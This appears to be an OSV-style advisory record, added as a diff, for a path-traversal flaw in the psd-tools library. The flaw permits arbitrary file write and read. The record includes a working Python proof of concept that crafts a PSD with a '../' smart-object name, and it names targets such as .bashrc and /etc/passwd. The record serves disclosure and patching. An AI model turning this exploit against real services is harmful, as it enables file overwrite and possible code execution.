@@ -1,0 +1,183 @@
+{
+  "id": "PYSEC-2026-2969",
+  "modified": "2026-07-13T16:33:07.841756813Z",
+  "published": "2026-07-13T15:46:30.567372Z",
+  "aliases": [
+    "CVE-2026-49836",
+    "GHSA-2rmg-vrx8-9j2f"
+  ],
+  "summary": "psd-tools vulnerable to arbitrary file write via smart-object filename",
+  "details": "# psd-tools: arbitrary file write/read via smart-object path traversal\n\n## Summary\n\nIn `psd-tools` (all releases exposing the `SmartObject` API through **v1.17.0**), `SmartObject.save()` writes an embedded smart object to a path taken verbatim from the PSD file. Because that name is attacker-controlled and unsanitised, a tool that extracts embedded objects from an untrusted `.psd` can be made to write attacker-chosen bytes to an attacker-chosen path (absolute or `../`-traversing), outside its intended output directory.\n\nA secondary issue in `SmartObject.open()` for external-kind smart objects allows the attacker-controlled `fullPath` descriptor to be used as an arbitrary file **read** path, enabling exfiltration of the read content to the controlled write destination. Both issues are fixed in **v1.17.1**.\n\n## Details\n\n### Write path — `SmartObject.save()` (primary)\n\n`src/psd_tools/api/smart_object.py:170-179` (tag `v1.17.0`):\n\n```python\ndef save(self, filename: str | None = None) -\u003e None:\n    if filename is None:\n        filename = self.filename          # untrusted, straight from the file\n    with open(filename, \"wb\") as f:\n        f.write(self.data)                # attacker-controlled bytes\n```\n\n`self.filename` comes from the file with no validation — the `filename` property (`:62-67`) returns `self._data.filename`, set by the linked-layer parser at `src/psd_tools/psd/linked_layer.py:100` (`read_unicode_string(fp)`). There is no `basename`, no absolute path rejection, and no `..` filtering; the written contents (`self.data`) are likewise from the file, so the attacker controls both destination and content.\n\n### Read path — `SmartObject.open()` / `.data` for external kind (secondary)\n\nFor `kind == \"external\"`, `save()` read file content via the `data` property, which called `open()` with no `external_dir` constraint. The `fullPath` descriptor embedded in the PSD was then used verbatim as the source path, enabling an attacker-crafted PSD to cause `save(directory=\"/safe/out\")` to read an arbitrary readable file (e.g. `/etc/passwd`) and write its contents to the output directory.\n\n## Proof of concept\n\nStandalone, against the released package (writes only into a fresh temp dir; exit 0 = confirmed). A Docker bundle is available on request.\n\n```bash\npip install psd-tools==1.17.0\npython poc.py\n```\n\n`poc.py` builds two PSDs from the project's own `placedLayer.psd` fixture (included as `base.psd`), differing **only** in the embedded smart-object name — `control` is a bare basename, `exploit` is `../../PWNED-psd-tools-poc.bin` — then extracts each like a consumer would:\n\n```python\nimport os, shutil, tempfile\nfrom psd_tools import PSDImage\nfrom psd_tools.constants import Tag\n\nMARKER = b\"PSD-TOOLS-POC: arbitrary-file-write payload (attacker-controlled bytes)\\n\"\nNAMES = {\"control\": \"embedded-export.bin\", \"exploit\": \"../../PWNED-psd-tools-poc.bin\"}\n\ndef craft(name, out):\n    psd = PSDImage.open(os.path.join(os.path.dirname(__file__), \"base.psd\"))\n    uuid = next(l.smart_object.unique_id for l in psd.descendants()\n                if l.kind == \"smartobject\" and l.smart_object.kind == \"data\")\n    for key in (Tag.LINKED_LAYER1, Tag.LINKED_LAYER2, Tag.LINKED_LAYER3, Tag.LINKED_LAYER_EXTERNAL):\n        for item in (psd.tagged_blocks.get_data(key) or []) if key in psd.tagged_blocks else []:\n            if item.uuid.strip(\"\\x00\") == uuid:\n                item.filename, item.data = name, MARKER\n    psd.save(out)\n\ndef extract(psd_path, outdir, watch):\n    psd = PSDImage.open(psd_path)\n    before = {os.path.realpath(os.path.join(d, f)) for d, _, fs in os.walk(watch) for f in fs}\n    cwd = os.getcwd(); os.chdir(outdir)\n    try:\n        for l in psd.descendants():\n            if l.kind == \"smartobject\" and l.smart_object.kind == \"data\":\n                l.smart_object.save()\n    finally:\n        os.chdir(cwd)\n    after = {os.path.realpath(os.path.join(d, f)) for d, _, fs in os.walk(watch) for f in fs}\n    return sorted(after - before)\n\ndef main():\n    tmp = tempfile.mkdtemp(prefix=\"poc_\")\n    try:\n        escaped = {}\n        for tag, name in NAMES.items():\n            psd = os.path.join(tmp, tag + \".psd\"); craft(name, psd)\n            so = next(l.smart_object for l in PSDImage.open(psd).descendants()\n                      if l.kind == \"smartobject\" and l.smart_object.kind == \"data\")\n            print(f\"[{tag}] parsed embedded name = {so.filename!r}\")\n            outdir = os.path.join(tmp, tag, \"app\", \"extracted\"); os.makedirs(outdir)\n            written = extract(psd, outdir, tmp); out = os.path.realpath(outdir)\n            esc = [w for w in written if not w.startswith(out + os.sep)]; escaped[tag] = esc\n            for w in written:\n                print(f\"[{tag}] wrote {w}  {chr(39)}OUTSIDE output dir{chr(39) if w in esc else chr(39)}inside output dir{chr(39)}\")\n        ok = (not escaped[\"control\"] and escaped[\"exploit\"]\n              and all(open(w, \"rb\").read() == MARKER for w in escaped[\"exploit\"]))\n        print(\"\\nVERDICT:\", \"ARBITRARY FILE WRITE CONFIRMED\" if ok else \"not reproduced\")\n        return 0 if ok else 1\n    finally:\n        shutil.rmtree(tmp, ignore_errors=True)\n\nraise SystemExit(main())\n```\n\nOutput (`psd-tools 1.17.0`):\n\n```\n[control] parsed embedded name = 'embedded-export.bin'\n[control] wrote .../poc_*/control/app/extracted/embedded-export.bin  inside output dir\n[exploit] parsed embedded name = '../../PWNED-psd-tools-poc.bin'\n[exploit] wrote .../poc_*/exploit/PWNED-psd-tools-poc.bin  OUTSIDE output dir\n\nVERDICT: ARBITRARY FILE WRITE CONFIRMED\n```\n\nAn absolute embedded name (e.g. `/home/user/.bashrc`) is honoured the same way.\n\n## Impact\n\nAny application that ingests untrusted PSD/PSB files and extracts their embedded smart objects via `SmartObject.save()` can be coerced into writing attacker-controlled bytes to an attacker-chosen existing directory — no authentication or special configuration required. High integrity impact; can escalate to code execution depending on the target path.\n\nFor external-kind smart objects the same call additionally allowed arbitrary file reads, with the read content written to the controlled output directory.\n\n## Severity\n\n**Moderate** for the common case (a library/desktop tool where a user initiates extraction). Higher for a service that auto-extracts smart objects from uploaded PSDs without user interaction.\n\n## Patch\n\nFixed in **v1.17.1** (PR #657). Changes to `src/psd_tools/api/smart_object.py`:\n\n- **`save()`**: strips directory components from the embedded name via `os.path.basename()`, writes only into a caller-supplied `directory` (defaults to CWD), and verifies the resolved path stays inside that directory via `os.path.realpath()` + `os.path.commonpath()`. A new `external_dir` parameter is propagated to `open()` for external-kind objects to constrain the read source.\n- **`open()`**: when `external_dir` is provided, a `fullPath` resolving outside it is silently ignored (falls through to `relPath`); a `relPath` escaping the directory raises `ValueError`.\n\n## Weaknesses\n\nCWE-22 (Improper Limitation of a Pathname to a Restricted Directory) via CWE-73 (External Control of File Name or Path).\n\n## Resources\n\n- Fix PR: https://github.com/psd-tools/psd-tools/pull/657\n- Release: https://github.com/psd-tools/psd-tools/releases/tag/v1.17.1\n- Affected source (tag `v1.17.0`): `src/psd_tools/api/smart_object.py:170-179`\n  (sink), `:62-67` (untrusted `filename`); `src/psd_tools/psd/linked_layer.py:100`\n  (source).\n- Distinct in class from the published advisories (GHSA-24p2-j2jr-386w —\n  compression resource exhaustion; GHSA-22jr-vc7j-g762 — buffer overflow). The\n  `save()` write logic is unchanged since the `SmartObject` API was introduced,\n  so all releases exposing it are affected.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "psd-tools",
+        "purl": "pkg:pypi/psd-tools"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.17.1"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.1.1",
+        "0.1.2",
+        "0.1.3",
+        "0.1.4",
+        "0.10",
+        "0.2",
+        "0.5",
+        "0.6",
+        "0.7",
+        "0.7.1",
+        "0.8",
+        "0.8.1",
+        "0.8.2",
+        "0.8.3",
+        "0.8.4",
+        "0.9",
+        "0.9.1",
+        "1.0",
+        "1.1",
+        "1.10.0",
+        "1.10.1",
+        "1.10.10",
+        "1.10.11",
+        "1.10.12",
+        "1.10.13",
+        "1.10.2",
+        "1.10.3",
+        "1.10.4",
+        "1.10.5",
+        "1.10.6",
+        "1.10.7",
+        "1.10.8",
+        "1.10.9",
+        "1.11.0",
+        "1.11.1",
+        "1.12.0",
+        "1.12.1",
+        "1.12.2",
+        "1.13.0",
+        "1.13.1",
+        "1.14.0",
+        "1.14.1",
+        "1.14.2",
+        "1.14.3",
+        "1.15.0.post1",
+        "1.16.0",
+        "1.17.0",
+        "1.2",
+        "1.3",
+        "1.4",
+        "1.8.10",
+        "1.8.11",
+        "1.8.12",
+        "1.8.13",
+        "1.8.14",
+        "1.8.15",
+        "1.8.16",
+        "1.8.17",
+        "1.8.18",
+        "1.8.19",
+        "1.8.20",
+        "1.8.21",
+        "1.8.22",
+        "1.8.23",
+        "1.8.24",
+        "1.8.25",
+        "1.8.26",
+        "1.8.27",
+        "1.8.28",
+        "1.8.29",
+        "1.8.30",
+        "1.8.31",
+        "1.8.32",
+        "1.8.33",
+        "1.8.34",
+        "1.8.35",
+        "1.8.36",
+        "1.8.37",
+        "1.8.38",
+        "1.8.8",
+        "1.8.9",
+        "1.9.0",
+        "1.9.1",
+        "1.9.10",
+        "1.9.11",
+        "1.9.12",
+        "1.9.13",
+        "1.9.14",
+        "1.9.15",
+        "1.9.16",
+        "1.9.17",
+        "1.9.18",
+        "1.9.19",
+        "1.9.2",
+        "1.9.20",
+        "1.9.21",
+        "1.9.22",
+        "1.9.23",
+        "1.9.24",
+        "1.9.26",
+        "1.9.27",
+        "1.9.28",
+        "1.9.29",
+        "1.9.3",
+        "1.9.30",
+        "1.9.31",
+        "1.9.32",
+        "1.9.33",
+        "1.9.34",
+        "1.9.4",
+        "1.9.5",
+        "1.9.6",
+        "1.9.7",
+        "1.9.8",
+        "1.9.9"
+      ],
+      "database_specific": {
+        "source": "https://github.com/pypa/advisory-database/blob/main/vulns/psd-tools/PYSEC-2026-2969.yaml"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/psd-tools/psd-tools/security/advisories/GHSA-2rmg-vrx8-9j2f"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/psd-tools/psd-tools/pull/657"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/psd-tools/psd-tools"
+    },
+    {
+      "type": "WEB",
+      "url": "http://github.com/psd-tools/psd-tools/releases/tag/v1.17.1"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://pypi.org/project/psd-tools"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-2rmg-vrx8-9j2f"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-49836"
+    }
+  ]
+}
